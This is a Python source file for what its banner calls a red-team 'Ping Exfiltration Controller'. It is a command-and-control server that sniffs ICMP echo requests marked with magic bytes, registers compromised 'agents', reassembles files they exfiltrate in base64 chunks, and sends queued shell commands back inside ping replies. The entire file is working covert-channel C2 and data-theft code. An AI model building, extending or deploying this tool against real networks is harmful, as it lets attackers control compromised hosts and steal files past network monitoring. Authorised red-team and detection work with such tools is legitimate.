import os
import sys
import logging
import json
import base64
import time
import threading

# Add Npcap to PATH for Windows
if os.name == 'nt':
    os.environ['PATH'] += os.pathsep + r"C:\Windows\System32\Npcap"

from scapy.all import sniff, ICMP, IP, send
from scapy.config import conf
# conf.use_pcap = False # Re-enable pcap
from collections import defaultdict
import uuid

# Configuration
with open('config.json', 'r') as f:
    CONFIG = json.load(f)

# Logging setup
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(CONFIG['log_file']),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# State management
AGENTS = {}
COMMAND_QUEUE = defaultdict(list)
FILE_TRANSFERS = defaultdict(lambda: {'chunks': {}, 'total_chunks': 0, 'filename': ''})
MAGIC_BYTES = CONFIG['magic_bytes'].encode()

# Callback for WebSocket emissions (to avoid circular import)
_socketio_callback = None

def set_socketio_callback(callback):
    global _socketio_callback
    _socketio_callback = callback

class Agent:
    def __init__(self, ip, hostname="Unknown", os_type="Unknown"):
        self.id = str(uuid.uuid4())[:8]
        self.ip = ip
        self.hostname = hostname
        self.os_type = os_type
        self.last_seen = time.time()
        self.status = "active"

    def update_seen(self):
        self.last_seen = time.time()
        self.status = "active"

def handle_packet(packet):
    """
    Callback for Scapy sniff. Processes incoming ICMP packets.
    """
    if ICMP in packet:
        src_ip = packet[IP].src
        icmp_type = packet[ICMP].type
        payload_len = len(bytes(packet[ICMP].payload))
        logger.debug(f"Captured ICMP packet from {src_ip}: type={icmp_type}, len={payload_len}")

    if ICMP in packet and packet[ICMP].type == 8:  # ICMP Echo Request
        src_ip = packet[IP].src
        payload = bytes(packet[ICMP].payload)
        
        logger.debug(f"Processing ICMP Echo Request from {src_ip}, payload length: {len(payload)}")
        
        # Check for magic bytes to identify our agents
        if MAGIC_BYTES in payload:
            logger.info(f"Magic bytes found in packet from {src_ip}!")
            try:
                # Payload format: MAGIC_BYTES|MSG_TYPE|DATA
                # MSG_TYPE: B (Beacon), D (Data/File), R (Response/Output)
                content = payload.split(MAGIC_BYTES, 1)[1]
                msg_type = chr(content[0])
                data = content[1:]
                
                process_agent_message(src_ip, msg_type, data)
                
                # Send response (Command if available)
                send_response(packet, src_ip)
                
            except Exception as e:
                logger.error(f"Error processing packet from {src_ip}: {e}")

def process_agent_message(src_ip, msg_type, data):
    """
    Process decoded message from agent.
    """
    agent = AGENTS.get(src_ip)
    
    if not agent:
        # Register new agent (simplified for now, usually happens on first beacon)
        agent = Agent(src_ip)
        AGENTS[src_ip] = agent
        logger.info(f"New agent detected: {src_ip}")
        logger.info(f"AGENTS dictionary now has {len(AGENTS)} agents: {list(AGENTS.keys())}")
    
    agent.update_seen()

    if msg_type == 'B': # Beacon
        try:
            # Beacon payload: HOSTNAME|OS
            decoded = base64.b64decode(data).decode().split('|')
            if len(decoded) >= 2:
                agent.hostname = decoded[0]
                agent.os_type = decoded[1]
                logger.info(f"Beacon from {src_ip}: {agent.hostname} ({agent.os_type})")
            logger.debug(f"Beacon from {src_ip}")
        except:
            pass


    elif msg_type == 'R': # Command Response
        try:
            decoded = base64.b64decode(data).decode()
            logger.info(f"Output from {src_ip}:\n{decoded}")
            
            # Broadcast output to connected clients via WebSocket
            if _socketio_callback:
                _socketio_callback('command_output', {
                    'ip': src_ip,
                    'output': decoded
                })
        except Exception as e:
            logger.error(f"Failed to decode response from {src_ip}: {e}")


    elif msg_type == 'D': # File Data
        try:
            # Data payload: FILE_ID|CHUNK_NUM|TOTAL_CHUNKS|FILENAME|CONTENT_B64
            parts = data.split(b'|', 4)
            if len(parts) == 5:
                file_id = parts[0].decode()
                chunk_num = int(parts[1])
                total_chunks = int(parts[2])
                filename = parts[3].decode()
                content = parts[4] # Already b64 encoded in the packet, need to decode for storage or keep as is?
                # Usually agents send raw bytes encoded in base64 in the payload wrapper not double encoded
                # Let's assume inner content is raw bytes
                
                transfer = FILE_TRANSFERS[file_id]
                transfer['filename'] = filename
                transfer['total_chunks'] = total_chunks
                transfer['chunks'][chunk_num] = content
                
                logger.info(f"Received chunk {chunk_num}/{total_chunks} for file {filename} from {src_ip}")
                
                check_file_completion(file_id, src_ip)
        except Exception as e:
            logger.error(f"Error processing file data from {src_ip}: {e}")

def check_file_completion(file_id, src_ip):
    transfer = FILE_TRANSFERS[file_id]
    if len(transfer['chunks']) == transfer['total_chunks']:
        logger.info(f"File transfer complete: {transfer['filename']}")
        # Reconstruct and decode base64 chunks
        file_content_b64 = b''
        for i in range(1, transfer['total_chunks'] + 1):
            file_content_b64 += transfer['chunks'][i]
        
        # Decode the base64-encoded content
        try:
            file_content = base64.b64decode(file_content_b64)
        except Exception as e:
            logger.error(f"Failed to decode file content: {e}")
            return
        
        # Save to uploads directory
        os.makedirs('uploads', exist_ok=True)
        filepath = os.path.join('uploads', f"{src_ip}_{transfer['filename']}")
        with open(filepath, 'wb') as f:
            f.write(file_content)
        
        logger.info(f"File saved to {filepath}")
        del FILE_TRANSFERS[file_id]

def send_response(request_packet, dest_ip):
    """
    Send ICMP Echo Reply. If commands are queued, embed them.
    """
    logger.debug(f"send_response called for {dest_ip}, queue length: {len(COMMAND_QUEUE[dest_ip])}")
    
    # Check for queued commands
    payload = b''
    if COMMAND_QUEUE[dest_ip]:
        cmd = COMMAND_QUEUE[dest_ip].pop(0)
        # Format: MAGIC_BYTES|C|COMMAND_B64
        payload = MAGIC_BYTES + b'C' + base64.b64encode(cmd.encode())
        logger.info(f"Sending command to {dest_ip}: {cmd}")
    else:
        # Empty heartbeat response
        payload = MAGIC_BYTES + b'A' # A for Ack
        logger.debug(f"Sending ACK to {dest_ip}")

    # Construct reply
    # Scapy automatically handles the ICMP ID and Seq from the request if we copy them or let it reply?
    # Better to manually construct to be sure
    
    reply = IP(dst=dest_ip, src=request_packet[IP].dst) / \
            ICMP(type=0, id=request_packet[ICMP].id, seq=request_packet[ICMP].seq) / \
            payload
    
    logger.debug(f"Sending ICMP reply to {dest_ip}, payload length: {len(payload)}")        
    send(reply, verbose=0)
    logger.debug(f"ICMP reply sent to {dest_ip}")

def start_sniffer():
    logger.info(f"Starting ICMP sniffer on all interfaces")
    try:
        # On Windows, sniffing without iface parameter captures on all interfaces
        logger.info("Sniffing on all available interfaces...")
        sniff(filter="icmp", prn=handle_packet, store=0)
    except Exception as e:
        logger.error(f"Failed to start sniffer: {e}")
        logger.error("Is Npcap installed? Packet capture requires Npcap on Windows.")
        logger.error("Continuing without packet capture (Web UI only mode).")
        import traceback
        traceback.print_exc()

def queue_command(ip, command):
    COMMAND_QUEUE[ip].append(command)
    logger.info(f"Queued command for {ip}: {command}")

if __name__ == "__main__":
    banner = """
    ╔══════════════════════════════════════════════════════════════╗
    ║                 PING EXFILTRATION CONTROLLER                 ║
    ║                     Red Team Framework                       ║
    ╚══════════════════════════════════════════════════════════════╝
    """
    print(banner)
    
    # Verify privileges (need root/admin for raw sockets)
    try:
        test = IP(dst="8.8.8.8")/ICMP()
        del test
    except Exception as e:
        logger.critical("Error: This script requires root/admin privileges for raw sockets.")
        exit(1)

    t = threading.Thread(target=start_sniffer)
    t.daemon = True
    t.start()
    
    try:
        while True:
            time.sleep(1)
            # Prune inactive agents logic could go here
    except KeyboardInterrupt:
        logger.info("Shutting down...")
